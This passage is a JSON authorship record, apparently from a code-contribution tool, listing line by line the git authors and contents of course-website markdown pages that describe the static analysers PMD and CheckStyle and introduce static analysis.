        "content": "- [Java](https://pmd.github.io/pmd-5.5.3/pmd-java/index.html) (includes [JSP](https://pmd.github.io/pmd-5.5.3/pmd-java/index.html) with [limitations](https://pmd.github.io/pmd-5.5.3/pmd-jsp/index.html))"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "- [JavaScript](https://pmd.github.io/pmd-5.5.3/pmd-javascript/index.html)"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "- [Apex](https://pmd.github.io/pmd-5.5.3/pmd-apex/index.html)"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "- [PL/SQL](https://pmd.github.io/pmd-5.5.3/pmd-plsql/index.html)"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "- [Velocity](https://pmd.github.io/pmd-5.4.1/pmd-vm/index.html)"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "- [XML and XSL](https://pmd.github.io/pmd-5.5.3/pmd-xml/index.html)"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "PMD doesn\u0027t support checking rules for the following languages. Only Copy/Paste Detector ([CPD](http://pmd.sourceforge.net/pmd-4.3.0/cpd.html)) is supported for them."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "- [C++](https://pmd.github.io/pmd-5.5.3/pmd-cs/index.html)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "- [C#](https://pmd.github.io/pmd-5.5.3/pmd-cpp/index.html)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "- [Fortran](https://pmd.github.io/pmd-5.5.3/pmd-fortran/index.html)"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "- [Go](https://pmd.github.io/pmd-5.5.3/pmd-go/index.html)"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "- [Groovy](https://pmd.github.io/pmd-5.5.3/pmd-groovy/index.html)"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "- [Matlab](https://pmd.github.io/pmd-5.5.3/pmd-matlab/index.html)"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "- [Objective-C](https://pmd.github.io/pmd-5.5.3/pmd-objectivec/index.html)"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "- [Perl](https://pmd.github.io/pmd-5.5.3/pmd-perl/index.html) (only very basic CPD support)"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "- [PHP](https://pmd.github.io/pmd-5.5.3/pmd-php/index.html)"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "- [Python](https://pmd.github.io/pmd-5.5.3/pmd-python/index.html)"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ruby](https://pmd.github.io/pmd-5.5.3/pmd-ruby/index.html)"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "- [Swift](https://pmd.github.io/pmd-5.5.3/pmd-swift/index.html)"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "- [Scala](https://pmd.github.io/pmd-5.5.3/pmd-scala/index.html)"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "## Limitation"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Limitations are almost the same as [CheckStyle](CheckStyle.html)."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "- The examined code has to be compilable. The reason is described in [How does it work](#how-does-it-work) section."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "- Files will be examined one by one, which means you cannot check multiple files at the same time. "
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "\t- For example, you cannot determine the full inheritance hierarchy of a class as you need to examine the parent class while checking the child class."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Use It?"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "### Download"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "PMD can be run on both Windows and Linux/Unix operating system with the help of [Java JRE](https://www.oracle.com/technetwork/java/javase/overview/index.html) 1.7 or higher. Refer to [How to install PMD and CPD](https://pmd.github.io/pmd-5.5.3/usage/installing.html) for more details."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "### Configuration"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "You can configure PMD to only include the rules that your want (see [How to make a new rule set](https://pmd.github.io/pmd-5.5.3/customizing/howtomakearuleset.html))."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "### Suppress Warnings"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "PMD supports suppressing warnings in four ways:"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "- Annotations"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "- Comments"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "- Violation Suppress Regex"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "- Violation Suppress XPath"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "The details are described [here](https://pmd.github.io/pmd-5.5.3/usage/suppressing.html)."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "### Command Line Usage"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "PMD can be launched by using command line with various arguments. For details, please refer to [Running PMD via command line](https://pmd.github.io/pmd-5.5.3/usage/running.html)."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Integration With Build Automation Tools"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ant task usage](https://pmd.github.io/pmd-5.5.3/usage/ant-task.html)"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "- [The PMD Plugin in Gradle](https://docs.gradle.org/current/userguide/pmd_plugin.html)"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "- [Maven 1 PMD plugin](https://pmd.github.io/pmd-5.5.3/usage/maven-plugin.html)"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "- [Maven 2 PMD plugin](https://pmd.github.io/pmd-5.5.3/usage/mvn-plugin.html)"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Integration With IDEs"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "PMD can be integrated with most of IDEs, inlcuding BlueJ, CodeGuide, Eclipse, eclipse-pmd, Emacs, Gel, IntelliJ IDEA, IntelliJ IDEA - QAPlug, JBuilder, JCreator, JDeveloper, JEdit, Maven, Maven 2, NetBeans, TextPad, WebLOgic Workshop 8.1.x. For instruction to integrate with those IDEs, please refer to [PMD integrations](https://pmd.github.io/pmd-5.5.3/usage/integrations.html)."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "## Available Rulesets"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "There is not pre-defined rules set. You need to [define your rule sets](https://pmd.github.io/pmd-5.5.3/customizing/howtomakearuleset.html) by yourself."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "PMD has organised rules into different categories. For example, the rules for Java has been categorised into 26 sections, which will help you quickly find the rules that you want."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "You may refer to the [Features](#features) section to view the rules according to your languages and refer to [Configuration](#configuration) section to configure your rulesets."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How Does it Work?"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "PMD use [JavaCC](https://javacc.org) to parse your code to a [AST(Abstract Syntax Tree)](https://en.wikipedia.org/wiki/Abstract_syntax_tree) and visited it recursively ([more details](https://pmd.github.io/pmd-5.4.1/customizing/howitworks.html)). Thus, one of the requirements for PMD to work is that the code must be in valid Java syntax. You can view the syntax tree by using [bin/designer.bat](https://pmd.github.io/pmd-5.5.3/customizing/howtowritearule.html)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "## Customization"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "- [How to write a PMD rule](https://pmd.github.io/pmd-5.5.3/customizing/howtowritearule.html) (A quicker way to write rule sets [Using XPath in PMD](https://pmd.github.io/pmd-5.4.1/customizing/xpathruletutorial.html), [XPath Rule tutorial](https://pmd.github.io/pmd-5.4.1/customizing/xpathruletutorial.html))"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "- [Add supports for new language](https://pmd.github.io/pmd-5.4.1/customizing/new-language.html) ([Add supports for CPD](https://pmd.github.io/pmd-5.4.1/customizing/cpd-parser-howto.html))"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "- [PMD](https://pmd.github.io/): PMD official website. You can download the latest version, view online documentation there."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "- [PMD Github](https://github.com/pmd/pmd): PMD GitHub page. You can contribute to the project or report bugs there."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "- [StackOverflow PMD](https://stackoverflow.com/questions/tagged/pmd): Question/Answer forum in StackOverflow for PMD. You can ask question related to the using of PMD."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 2,
      "iskandarzulkarnaien": 18,
      "-": 101
    }
  },
  {
    "path": "contents/staticAnalysis/checkStyle.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: CheckStyle"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# CheckStyle"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Xiao Pu](https://nus-oss.github.io/cs3281-website/students/AY1617S2/xiaoPu/xiaoPu-Resume.html)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Features‎](#features)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Limitations‎](#limitations)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to use it‎?](#how-to-use-it)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Configuration‎](#configuration)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Suppress Warnings‎](#suppress-warnings)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Running‎](#running)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Available Configurations‎](#available-configurations)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How does it work?‎](#how-does-it-work)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Customisation‎](#customisation)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources‎](#resources)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "CheckStyle is a static analyser for **Java**. It can be used to assist developers in [static analysis](intro.html) process."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "## Features"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "CheckStyle will examine code based on different rules(or checks)."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "According to the [checks list](http://checkstyle.sourceforge.net/checks.html) provided by CheckStyle, the checks(rules) can be divided into 14 sections."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "- Annotations"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "- Block Checks"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "- Class Design"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "- Coding"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "- Headers"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "- Imports"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "- Javadoc Comments"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "- Metrics"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "- Miscellaneous"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "- Modifiers"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "- Naming Conventions"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "- Regexp"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "- Size Violations"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "- Whitespace"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "## Limitations"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "As described [here](http://checkstyle.sourceforge.net/writingchecks.html#Limitations), there are several limitations in CheckStyle."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "- The code must be written in ASCII characters only."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "- The examined code has to be compilable. The reason is described in [How does it work](#how-does-it-work) section."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "- Files will be examined one by one, which means you cannot check multiple files at the same time."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "\t- For example, you cannot determine the full inheritance hierarchy of a class as you need to examine the parent class while checking the child class."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Use It?"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "### Configuration"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "CheckStyle uses a [configuration file](http://checkstyle.sourceforge.net/config.html) to know all the rules that it is supposed to check."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "### Suppress Warnings"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "CheckStyle supports suppressing warnings in four ways:"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "- [Annotations](http://checkstyle.sourceforge.net/config_filters.html#SuppressWarningsFilter)"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "- [Comments](http://checkstyle.sourceforge.net/config_filters.html#SuppressionCommentFilter)"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [File Filter](http//checkstyle.sourceforge.net/config_filefilters.html#BeforeExecutionExclusionFileFilter)"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "- [Configuration File](http://checkstyle.sourceforge.net/config_filters.html#SuppressionFilter)"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "### Running"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "There are several ways to run CheckStyle."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Command Line:"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "- [Command Line](http://checkstyle.sourceforge.net/cmdline.html)"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "Build Automation Tools:"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ant Task](http://checkstyle.sourceforge.net/anttask.html)"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "- [Maven Checkstyle](https://maven.apache.org/plugins/maven-checkstyle-plugin/)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "- [Gradle Checkstyle](https://docs.gradle.org/current/userguide/checkstyle_plugin.html)"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "IDE Integration:"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "- [Eclipse Integration](http://eclipse-cs.sourceforge.net/#!/)"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "- [IntelliJ Integration](https://plugins.jetbrains.com/idea/plugin/1065-checkstyle-idea)"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "## Available Configurations"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "There are two widely used configurations: [Sun Code Conversions](https://www.oracle.com/technetwork/java/javase/documentation/codeconvtoc-136057.html) and [Google Java Style](http://checkstyle.sourceforge.net/reports/google-java-style.html). Some common rules are already included in these configurations."
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How Does It Work?"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "CheckStyle will use [ANTLR](https://www.antlr.org) to parse your code into a [AST(Abstract Syntax Tree)](https://en.wikipedia.org/wiki/Abstract_syntax_tree) and visit it in a [DFS(Depth First Search)](https://en.wikipedia.org/wiki/Depth-first_search) pattern to check violations. Thus, it is necessary to make the code compilable in order for the ANTLR to work.  You can view the syntax tree using [CheckStyle Grammar Tree Viewer](http://checkstyle.sourceforge.net/writingchecks.html#The_Checkstyle_SDK_Gui)"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "## Customisation"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "- [Writing Checks](http://checkstyle.sourceforge.net/writingchecks.html) (I want to write my own check for Java code.)"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "- [Writing Javadoc Checks](http://checkstyle.sourceforge.net/writingjavadocchecks.html) (I want to enforce new rules for writing Javadoc header comment.)"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "- [Writing Filters](http://checkstyle.sourceforge.net/writingfilters.html) (I will do something when violations are found.)"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "- [Writing File Filters](http://checkstyle.sourceforge.net/writingfilefilters.html) (I want to check the rules against specific files.)"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "- [Writing Listeners](http://checkstyle.sourceforge.net/writinglisteners.html) (I want different notifications (verbose printer, sending emails, etc) when violations are thrown.)"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "- [CheckStyle](http://checkstyle.sourceforge.net/): CheckStyle official website. You can download the latest version, view online documentation there."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "- [CheckStyle Github](https://github.com/checkstyle/checkstyle): CheckStyle GitHub page. You can contribute to the project or report bugs there."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [StackOverflow CheckStyle](https://stackoverflow.com/questions/tagged/checkstyle): Question/Answer forum in StackOverflow for CheckStyle. You can ask question related to the using of CheckStyle."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "jamessspanggg": 4,
      "iskandarzulkarnaien": 15,
      "-": 92
    }
  },
  {
    "path": "contents/staticAnalysis/intro.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Static Analysis"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Static Analysis"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Xiao Pu](https://nus-oss.github.io/cs3281-website/students/AY1617S2/xiaoPu/xiaoPu-Resume.html)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why Static Analysis?‎](#why-static-analysis)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\t* [Analyse Thoroughly‎](#analyse-thoroughly)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\t* [Find Potential Bugs Early‎](#find-potential-bugs-early)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\t* [Enforce a Standard in Project‎](#enforce-a-standard-in-project)"
      },
      {
        "lineNumber": 25,
        "author": {
